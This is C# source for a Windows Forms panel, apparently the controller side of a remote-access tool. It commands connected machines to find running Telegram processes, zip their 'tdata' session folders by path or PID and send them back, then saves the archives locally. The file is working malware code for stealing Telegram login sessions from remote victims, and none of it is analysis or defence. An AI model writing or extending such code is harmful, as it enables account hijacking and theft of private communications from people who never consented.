using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Server
{
    public class FrmTgSafeWPackager : FrmBase
    {
        private SocketSession _session;
        private TextBox _outputPath;
        private TextBox _pathInput;
        private TextBox _pidInput;
        private TextBox _logBox;
        private Label _scanStatus;
        private Label _sessionCount;

        public FrmTgSafeWPackager(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "TG SafeW 打包工具 — " + hostName;
            this.Size = new Size(650, 500);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 180;
            topPanel.Padding = new Padding(8);

            // 输出路径
            var lblOutput = new Label();
            lblOutput.Text = "输出路径:";
            lblOutput.Location = new Point(10, 10);
            lblOutput.AutoSize = true;

            _outputPath = new TextBox();
            _outputPath.Text = "C:\\";
            _outputPath.Location = new Point(75, 7);
            _outputPath.Size = new Size(400, 22);

            // 一键全打包区域
            var grpFull = new GroupBox();
            grpFull.Text = "一键全打包";
            grpFull.Location = new Point(10, 38);
            grpFull.Size = new Size(200, 65);

            var btnScan = new Button();
            btnScan.Text = "扫描进程";
            btnScan.Location = new Point(10, 22);
            btnScan.Size = new Size(80, 26);
            btnScan.Click += OnScanProcesses;

            _scanStatus = new Label();
            _scanStatus.Text = "已扫描: --";
            _scanStatus.Location = new Point(100, 26);
            _scanStatus.AutoSize = true;

            var btnFullPkg = new Button();
            btnFullPkg.Text = "全部打包";
            btnFullPkg.Location = new Point(100, 22);
            btnFullPkg.Size = new Size(80, 26);
            btnFullPkg.Visible = false;
            btnFullPkg.Click += OnFullPackage;

            grpFull.Controls.AddRange(new Control[] { btnScan, _scanStatus, btnFullPkg });

            // 按路径打包区域
            var grpPath = new GroupBox();
            grpPath.Text = "按路径打包";
            grpPath.Location = new Point(220, 38);
            grpPath.Size = new Size(400, 65);

            _pathInput = new TextBox();
            _pathInput.Location = new Point(10, 24);
            _pathInput.Size = new Size(280, 22);

            var btnPathPkg = new Button();
            btnPathPkg.Text = "开始打包";
            btnPathPkg.Location = new Point(300, 22);
            btnPathPkg.Size = new Size(80, 26);
            btnPathPkg.Click += OnPathPackage;

            grpPath.Controls.AddRange(new Control[] { _pathInput, btnPathPkg });

            // 按PID打包区域
            var grpPid = new GroupBox();
            grpPid.Text = "按PID打包";
            grpPid.Location = new Point(10, 110);
            grpPid.Size = new Size(300, 60);

            var lblPid = new Label();
            lblPid.Text = "PID:";
            lblPid.Location = new Point(10, 22);
            lblPid.AutoSize = true;

            _pidInput = new TextBox();
            _pidInput.Location = new Point(40, 19);
            _pidInput.Size = new Size(140, 22);

            var btnPidPkg = new Button();
            btnPidPkg.Text = "按PID打包";
            btnPidPkg.Location = new Point(190, 17);
            btnPidPkg.Size = new Size(90, 26);
            btnPidPkg.Click += OnPidPackage;

            grpPid.Controls.AddRange(new Control[] { lblPid, _pidInput, btnPidPkg });

            topPanel.Controls.AddRange(new Control[] { lblOutput, _outputPath, grpFull, grpPath, grpPid });

            // 日志区域
            _logBox = new TextBox();
            _logBox.Dock = DockStyle.Fill;
            _logBox.Multiline = true;
            _logBox.ScrollBars = ScrollBars.Both;
            _logBox.ReadOnly = true;
            _logBox.Font = new Font("Consolas", 9F);
            _logBox.WordWrap = false;

            // 底部按钮
            var bottomPanel = new Panel();
            bottomPanel.Dock = DockStyle.Bottom;
            bottomPanel.Height = 36;
            bottomPanel.Padding = new Padding(8, 4, 8, 4);

            var btnStop = new Button();
            btnStop.Text = "停止任务";
            btnStop.Location = new Point(10, 5);
            btnStop.Size = new Size(80, 26);

            var btnClear = new Button();
            btnClear.Text = "清空日志";
            btnClear.Location = new Point(100, 5);
            btnClear.Size = new Size(80, 26);
            btnClear.Click += (s, e) => _logBox.Clear();

            _sessionCount = new Label();
            _sessionCount.Text = "会话数: 1 个";
            _sessionCount.Location = new Point(200, 9);
            _sessionCount.AutoSize = true;

            bottomPanel.Controls.AddRange(new Control[] { btnStop, btnClear, _sessionCount });

            this.Controls.Add(_logBox);
            this.Controls.Add(topPanel);
            this.Controls.Add(bottomPanel);
        }

        private void AppendLog(string message)
        {
            if (_logBox.InvokeRequired)
            {
                _logBox.BeginInvoke((Action)(() => AppendLog(message)));
                return;
            }
            _logBox.AppendText(string.Format("[{0}] {1}\r\n", DateTime.Now.ToString("HH:mm:ss"), message));
        }

        private void EnsureRelayBinding()
        {
            if (RSCApplication.oRemoteControlServer != null && _session != null)
                RSCApplication.oRemoteControlServer.SelectClient(_session.SocketId);
        }

        private void OnScanProcesses(object sender, EventArgs e)
        {
            AppendLog("正在扫描进程...");
            if (_session != null)
            {
                EnsureRelayBinding();
                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 2 });
            }
        }

        private void OnFullPackage(object sender, EventArgs e)
        {
            AppendLog("开始全打包，输出路径: " + _outputPath.Text);
            if (_session != null)
            {
                EnsureRelayBinding();
                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0 });
            }
        }

        private void OnPathPackage(object sender, EventArgs e)
        {
            string path = (_pathInput.Text ?? "").Trim();
            if (string.IsNullOrEmpty(path))
            {
                MessageBox.Show("请输入路径", "提示");
                return;
            }
            AppendLog("按路径打包: " + path);
            if (_session != null)
            {
                EnsureRelayBinding();
                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 1, TargetPath = path });
            }
        }

        private void OnPidPackage(object sender, EventArgs e)
        {
            string pid = (_pidInput.Text ?? "").Trim();
            if (string.IsNullOrEmpty(pid))
            {
                MessageBox.Show("请输入PID", "提示");
                return;
            }
            int pidVal = 0;
            if (!int.TryParse(pid, out pidVal) || pidVal <= 0)
            {
                MessageBox.Show("请输入有效的PID数字", "提示");
                return;
            }
            AppendLog("按PID打包: " + pid);
            if (_session != null)
            {
                EnsureRelayBinding();
                _session.Send(ePacketType.PACKET_TG_EXTRACT_REQUEST, new RequestTGExtract { Mode = 0, TargetPid = pidVal });
            }
        }

        public void HandleResponse(ResponseTGExtract resp)
        {
            if (resp == null) return;
            if (this.InvokeRequired)
            {
                this.BeginInvoke((Action)(() => HandleResponse(resp)));
                return;
            }

            if (!resp.Result)
            {
                AppendLog("失败: " + (resp.Message ?? "未知错误"));
                return;
            }

            // 扫描进程结果（没有TdataZip数据）
            if (resp.TdataZip == null || resp.TdataZip.Length == 0)
            {
                if (resp.ProcessInfoList != null && resp.ProcessInfoList.Length > 0)
                {
                    AppendLog(string.Format("扫描完成! 找到 {0} 个TG进程:", resp.ProcessInfoList.Length));
                    for (int i = 0; i < resp.ProcessInfoList.Length; i++)
                    {
                        string[] parts = resp.ProcessInfoList[i].Split('|');
                        string pid = parts.Length > 0 ? parts[0] : "?";
                        string name = parts.Length > 1 ? parts[1] : "?";
                        string exePath = parts.Length > 2 ? parts[2] : "";
                        string tdataDir = parts.Length > 3 ? parts[3] : "";
                        AppendLog(string.Format("  [{0}] PID={1} {2}", i + 1, pid, exePath));
                        if (!string.IsNullOrEmpty(tdataDir))
                            AppendLog("       tdata: " + tdataDir);
                    }
                    _scanStatus.Text = "已扫描: " + resp.ProcessInfoList.Length;
                }
                else
                {
                    AppendLog("扫描完成: 未找到运行中的TG进程");
                    _scanStatus.Text = "已扫描: 0";
                }

                if (!string.IsNullOrEmpty(resp.TdataPath))
                {
                    AppendLog("找到tdata目录: " + resp.TdataPath);
                    _pathInput.Text = resp.TdataPath;
                }

                if (resp.Found)
                    AppendLog("提示: 可以使用'开始打包'或'按PID打包'进行提取");
                return;
            }

            // 打包结果
            AppendLog("找到Telegram数据! 文件: " + resp.FileName);
            _scanStatus.Text = "已扫描: 1";
            _sessionCount.Text = "会话数: 1 个";

            try
            {
                string outDir = _outputPath.Text.Trim();
                if (string.IsNullOrEmpty(outDir)) outDir = "C:\\";
                if (!Directory.Exists(outDir))
                    Directory.CreateDirectory(outDir);

                string outFile = Path.Combine(outDir, resp.FileName);
                File.WriteAllBytes(outFile, resp.TdataZip);
                AppendLog("数据已保存到: " + outFile);
                AppendLog(string.Format("文件大小: {0:F2} MB", resp.TdataZip.Length / 1024.0 / 1024.0));
            }
            catch (Exception ex)
            {
                AppendLog("保存失败: " + ex.Message);
            }
        }
    }
}
